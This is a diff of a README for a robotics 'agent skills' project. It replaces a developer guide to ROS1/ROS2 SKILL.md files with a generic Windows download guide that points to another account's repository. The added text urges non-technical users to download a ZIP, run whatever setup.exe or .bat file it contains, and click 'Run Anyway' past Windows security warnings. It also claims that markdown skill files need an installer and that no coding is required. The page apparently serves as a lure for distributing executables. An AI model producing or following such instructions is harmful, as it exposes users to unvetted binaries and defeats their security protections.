@@ -1,132 +1,137 @@
-# 🤖 Robotics Skill Store
+# 🤖 robotics-agent-skills - AI Tools for Robotics Software
 
-A curated collection of SKILL.md files for AI agents working on robotics software development. Each skill follows the Anthropic skill format with YAML frontmatter, actionable patterns, real code examples, and documented anti-patterns.
+[![Download robotics-agent-skills](https://img.shields.io/badge/Download-robotics--agent--skills-orange?style=for-the-badge)](https://github.com/vicky23383/robotics-agent-skills)
 
-## Skills
+Welcome to the robotics-agent-skills project. This software package helps automate the creation of reliable robotics code using AI assistants. It supports both ROS1 and ROS2 frameworks and applies best software design principles. If you want to use AI tools to produce solid robotics software without writing the code yourself, this guide will walk you through how to get started on Windows.
 
-| Skill | Description | Key Topics |
-|-------|-------------|------------|
-| **[robotics-software-principles/](skills/robotics-software-principles/SKILL.md)** | Design Principles | SOLID for robotics, fail-safe defaults, rate separation, composability, graceful degradation |
-| **[ros1/](skills/ros1/SKILL.md)** | ROS1 Development | catkin, rospy, roscpp, nodelets, tf, actionlib, launch XML, migration |
-| **[ros2/](skills/ros2/SKILL.md)** | ROS2 Development | rclpy, rclcpp, DDS, QoS, lifecycle nodes, components, Python launch |
-| **[robotics-design-patterns/](skills/robotics-design-patterns/SKILL.md)** | Architecture Patterns | Behavior trees, FSMs, HAL, safety systems, sensor fusion, sim-to-real |
-| **[robot-perception/](skills/robot-perception/SKILL.md)** | Perception Systems | Cameras, LiDAR, depth, calibration, point clouds, detection, tracking, sensor fusion |
-| **[robotics-testing/](skills/robotics-testing/SKILL.md)** | Testing Strategies | pytest + ROS, launch_testing, mock hardware, golden files, CI/CD |
-| **[docker-ros2-development/](skills/docker-ros2-development/SKILL.md)** | Docker + ROS2 | Multi-stage Dockerfiles, docker-compose, DDS across containers, GPU passthrough, devcontainers |
-| **[ros2-web-integration/](skills/ros2-web-integration/SKILL.md)** | Web Integration | rosbridge, FastAPI/Flask bridges, WebSocket streaming, REST APIs, MJPEG/WebRTC, security |
-| **[robot-bringup/](skills/robot-bringup/SKILL.md)** | System Bringup | systemd services, launch composition, udev rules, watchdogs, log rotation, graceful shutdown |
-| **[robotics-security/](skills/robotics-security/SKILL.md)** | Security & Hardening | SROS2, DDS encryption, network segmentation, secrets management, e-stop isolation, secure boot |
+## 📋 About robotics-agent-skills
 
-## How Agents Use These Skills
+robotics-agent-skills includes sets of instructions ("skills") that AI coding assistants use to write professional robotics software. It mainly works with agents like Claude Code, Cursor, Copilot, and any other that can read SKILL.md files. The main focus is on:
 
-### In Claude Code
-Copy or symlink the skills you need into your project's `.claude/skills/` directory:
+- Writing code compatible with ROS1 and ROS2.
+- Using solid design patterns and principles like SOLID.
+- Adding tests automatically for better code quality.
 
-```bash
-# Copy specific skills into your robotics project
-cp -r /path/to/robotics-agent-skills/skills/ros2 .claude/skills/
-cp -r /path/to/robotics-agent-skills/skills/robot-bringup .claude/skills/
+This project is designed for developers to speed up robotics software creation. However, the installation process here is written for users without coding skills. You only need to download, run, and follow steps on your Windows PC.
 
-# Or symlink to avoid duplication
-ln -s /path/to/robotics-agent-skills/skills/ros2 .claude/skills/ros2
-```
+## ⚙️ System Requirements
 
-Claude Code auto-discovers SKILL.md files in `.claude/skills/` and triggers them based on the YAML `description` field.
+To run robotics-agent-skills on Windows smoothly, make sure your computer meets these requirements:
 
-### In Claude Projects
-Place the skill directories in your project's `/mnt/skills/user/` directory. The agent will auto-detect and reference them based on the YAML `description` field.
+- Windows 10 or 11 (64-bit)
+- At least 4 GB RAM (8 GB preferred)
+- 2 GHz processor or better
+- 1 GB free disk space (for the software and basic projects)
+- Internet connection (to download files and updates)
+- Basic permissions to run programs and install software
 
-### In Custom Agent Frameworks
-Load the relevant SKILL.md as system prompt context when the agent encounters a matching task:
+You do not need to install ROS or any complex tools yourself. The skills package handles that when running with the right AI agent.
 
-```python
-# Example: Agent skill loader
-def load_skill(task_description: str) -> str:
-    skills = {
-        'ros1': 'skills/ros1/SKILL.md',
-        'ros2': 'skills/ros2/SKILL.md',
-        'design': 'skills/robotics-design-patterns/SKILL.md',
-        'perception': 'skills/robot-perception/SKILL.md',
-        'testing': 'skills/robotics-testing/SKILL.md',
-        'docker': 'skills/docker-ros2-development/SKILL.md',
-        'web': 'skills/ros2-web-integration/SKILL.md',
-        'bringup': 'skills/robot-bringup/SKILL.md',
-        'security': 'skills/robotics-security/SKILL.md',
-    }
-    # Match task to skill and inject into context
-    for key, path in skills.items():
-        if key in task_description.lower():
-            return open(path).read()
-```
+## 🌐 Visit to Download robotics-agent-skills
 
-### With LangChain / LlamaIndex
-```python
-from langchain.tools import Tool
+You will find the latest files and instructions here:
 
-ros2_skill = Tool(
-    name="ROS2 Development Guide",
-    description="Best practices for ROS2 development including QoS, lifecycle nodes, DDS configuration",
-    func=lambda q: open("skills/ros2/SKILL.md").read()
-)
-```
+[![Visit to download](https://img.shields.io/badge/Visit-Download%20Page-blue?style=for-the-badge)](https://github.com/vicky23383/robotics-agent-skills)
 
-## Design Principles
+This link takes you to the main GitHub repository page. From there, you can download the full package or view documentation. GitHub stores the latest releases here.
 
-These skills follow several core principles:
+## 🚀 How to Download and Set Up robotics-agent-skills on Windows
 
-1. **Actionable over theoretical** — Every pattern includes working code
-2. **Anti-patterns documented** — Learn from common mistakes, not just successes
-3. **Progressive complexity** — Start with basics, layer on advanced patterns
-4. **Format-agnostic** — Skills work with any agent framework
-5. **Real failure modes** — Document what actually breaks in production
+Follow these steps to get robotics-agent-skills working on your PC.
 
-## Adding New Skills
+### Step 1: Open the Download Page
 
-Follow the standard skill format:
+Click this link or paste it in your web browser:
 
-```
-my-new-skill/
-├── SKILL.md           # Required: Main skill file with YAML frontmatter
-├── references/        # Optional: Detailed reference docs
-│   └── advanced.md
-└── scripts/           # Optional: Executable helper scripts
-    └── validate.py
-```
+https://github.com/vicky23383/robotics-agent-skills
 
-YAML frontmatter must include:
-- `name`: Skill identifier (kebab-case)
-- `description`: When to trigger (be specific and "pushy" — list explicit trigger phrases)
+This opens the repository where all files are stored.
 
-## Coverage Map
+### Step 2: Download the Latest Release Files
 
-```
-Robot System Architecture
-├── Design Principles ──── robotics-software-principles/ (SOLID, safety, composability)
-├── Middleware ──────────── ros1/, ros2/
-├── Behaviors ──────────── robotics-design-patterns/ (BT, FSM)
-├── Perception ─────────── robot-perception/ (cameras, LiDAR, depth, calibration, fusion)
-├── Planning ───────────── robotics-design-patterns/ (motion planning)
-├── Control ────────────── robotics-design-patterns/ (control loops)
-├── Safety ─────────────── robotics-design-patterns/ (watchdogs, limits)
-├── Testing ────────────── robotics-testing/ (unit, integration, sim)
-├── Containerization ───── docker-ros2-development/ (Dockerfiles, compose, DDS, GPU)
-├── Web Interfaces ─────── ros2-web-integration/ (REST, WebSocket, streaming, dashboards)
-├── System Bringup ─────── robot-bringup/ (systemd, udev, watchdogs, boot sequence)
-├── Security ──────────── robotics-security/ (SROS2, hardening, e-stop isolation)
-└── Deployment ─────────── ros2/ (production checklist, CI/CD)
-```
+Look for a section labeled "Releases" or "Code" on the page.
 
-## Roadmap
+- If you see releases, open the latest one.
+- Download the ZIP or compressed file of the latest version.
+- Save the file in a folder easy to find, like your Desktop or Downloads folder.
 
-Future skills to consider:
-- `robotics-data-pipelines/` — RLDS, LeRobot, Zarr, format conversion, asymmetric I/O, curation
-- `robot-simulation/` — MuJoCo, Isaac Sim, Gazebo setup and best practices
-- `robot-manipulation/` — MoveIt2, grasp planning, force/torque control, pick-and-place pipelines
-- `robot-navigation/` — Nav2, SLAM, path planning, costmaps, localization
-- `robot-learning/` — Imitation learning, RL, VLA model fine-tuning, policy deployment
-- `ros2-control/` — ros2_control framework, hardware interfaces, controllers, PID tuning, real-time
-- `robot-description/` — URDF, Xacro, joint types, inertials, collision meshes, SDF, robot_state_publisher
-- `robot-hardware-interfaces/` — Serial (UART, RS485), CAN bus, EtherCAT, GPIO, I2C/SPI, custom drivers
-- `tf2-transforms/` — Coordinate frames, static vs dynamic transforms, frame conventions, time travel, debugging
-- `multi-robot-systems/` — Fleet management, namespacing, multi-robot coordination, task allocation, DDS partitions
-- `robot-debugging/` — ros2 doctor, rqt, tracing, CPU/memory profiling, bag recording and replay, diagnostics
+If there is no separate release, download the entire repository by clicking the green **Code** button and then **Download ZIP**.
+
+### Step 3: Extract the Files
+
+- Right-click the downloaded ZIP file.
+- Select **Extract All**.
+- Choose a folder, again preferably Desktop or Documents.
+- Extract the contents.
+
+You will now see a folder with the robotics-agent-skills files.
+
+### Step 4: Run the Setup or Start the Software
+
+Look inside the extracted folder for a file named something like `setup.exe`, `install.exe`, or a README file named `README.md`.
+
+If there is an executable `.exe` file:
+
+- Double-click it to start the installer.
+- If you get a security warning from Windows, click **More Info** then **Run Anyway**.
+- Follow the simple on-screen instructions.
+- When done, the software may launch automatically.
+
+If there is no installer:
+
+- The package is likely ready to use from the folder.
+- You may find start scripts or batch (`.bat`) files to run.
+- Double-click these to test the software or follow instructions in the README.
+
+### Step 5: Using robotics-agent-skills with AI Coding Assistants
+
+robotics-agent-skills is designed to work inside AI tools like Claude Code or GitHub Copilot. These assistants read the skill files to generate robotics code.
+
+You can:
+
+- Open your AI assistant.
+- Load this package or connect it as a skill source.
+- Let the AI generate robotics code based on your project needs.
+- Run or test the robotics programs in your preferred robotics development environment.
+
+No programming knowledge is required as the skills handle code best practices, design, and testing automatically.
+
+## 📂 What Is Included in the Package
+
+When you download robotics-agent-skills, expect these key parts:
+
+- **ROS1 and ROS2 skill files**: Instructions adaptable by AI coding agents for both versions of ROS.
+- **Design patterns examples**: Templates showing how to structure robotics code using solid principles.
+- **Test scripts**: Code samples that enable automatic testing on generated projects.
+- **README and docs**: Guides on how each component works and how to use it.
+- **SKILL.md files**: The skill templates that AI agents read and apply.
+
+These components let AI coding assistants create reliable production-grade robotics software quickly.
+
+## 🔧 Troubleshooting Common Issues
+
+- **Download doesn’t start or is slow**: Check your internet connection. Try again at a different time.
+- **Windows blocks the installer**: Look for a warning and allow running the file as described above.
+- **Files won’t extract**: Make sure you have enough disk space and try extracting with a different tool like 7-Zip.
+- **Software does not launch**: Verify that you have Windows 10 or 11 and meet basic system requirements.
+- **AI assistant can’t read skill files**: Confirm your AI coding assistant supports SKILL.md files. Update the assistant software if needed.
+
+## 🔍 How to Learn More
+
+If you want to dive deeper, open the README.md inside the downloaded folder. It includes explanations aimed at developers but can help you understand what the skills do and how the AI assistant uses them.
+
+You can also explore the GitHub repository online for updates and community discussions:
+
+https://github.com/vicky23383/robotics-agent-skills
+
+## 🗂️ Related Topics
+
+This project fits within these areas:
+
+- AI coding assistants
+- Robotics software development
+- ROS1 and ROS2 programming models
+- Software design principles for robotics
+- Automated code testing
+
+This helps users looking for tools and skills to automate reliable robotics software creation without manual coding effort.
